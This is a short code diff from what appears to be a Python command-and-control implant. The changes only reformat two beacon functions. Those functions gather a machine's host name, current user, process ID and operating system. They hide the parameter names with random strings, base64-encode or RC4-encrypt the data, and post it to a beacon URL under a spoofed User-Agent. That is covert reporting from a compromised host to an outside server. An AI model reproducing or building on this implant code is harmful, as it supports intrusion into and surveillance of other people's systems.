@@ -49,10 +49,12 @@ def initial_beacon(hostname, current_user, process_id, operating_system):
         process_id_var = "".join(random.choice(string.lowercase) for i in range(10))
         operating_system_var = "".join(random.choice(string.lowercase) for i in range(10))
 
-        post_data = [(hostname_var, hostname),
+        post_data = [
+            (hostname_var, hostname),
             (current_user_var, current_user),
             (process_id_var, process_id),
-            (operating_system_var, operating_system)]
+            (operating_system_var, operating_system)
+        ]
 
         base64_post_data = base64.b64encode(urllib.urlencode(post_data))
 
@@ -68,7 +70,13 @@ def initial_beacon(hostname, current_user, process_id, operating_system):
 
 def rc4_beacon(key, hostname, current_user, process_id, operating_system):
     try:
-        post_data = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system}
+        post_data = {
+            "hostname": hostname,
+            "current_user": current_user,
+            "process_id": process_id,
+            "operating_system": operating_system
+        }
+
         request = urllib2.Request(beacon_url, data=crypt(key, json.dumps(post_data)))
         request.add_header("User-Agent", user_agent)
         request.add_header("Content-Type", "application/json")
